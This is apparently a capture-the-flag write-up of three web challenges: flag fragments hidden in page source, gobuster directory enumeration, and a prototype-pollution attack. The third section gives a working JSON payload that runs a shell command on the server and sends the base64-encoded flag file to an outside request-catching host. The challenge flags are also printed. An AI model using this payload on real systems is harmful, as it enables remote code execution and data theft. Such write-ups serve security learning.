### WEB 1 : Inspector Gadget

- Page Source:
```html
<head>
    [...omitted...]
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <center><h1>CHTB{</h1></center>
    <div id="container"></div>
</body>
[...omitted...]
<script src="/static/js/main.js"></script>
<!--1nsp3ction_-->
```
- /static/css/main.css
```css
/* c4n_r3ve4l_ */
[...omitted...]
```
- /static/js/main.js
```js
console.log("us3full_1nf0rm4tion}");
[...omitted...]
```

FLAG : CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}

---

### WEB 2 : DaaS

```console
$ gobuster dir -u http://138.68.141.182:30845/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt

/index.php            (Status: 200) [Size: 17474]
/storage              (Status: 301) [Size: 178] [--> http://138.68.141.182/storage/]
/robots.txt           (Status: 200) [Size: 24]
```

---

### WEB 3: BlitzProp

```http
POST /api/submit HTTP/1.1
Host: 138.68.141.182:32383
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.141.182:32383/
Content-Type: application/json
Origin: http://138.68.141.182:32383
Content-Length: 232
DNT: 1
Connection: close

{
    "song.name":"Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text",
        "line":"process.mainModule.require('child_process').execSync('wget https://jebidiah.free.beeceptor.com/$(cat flagjTXvx | base64)').toString()"
    }
}
```

FLAG : CHTB{p0llute_with_styl3}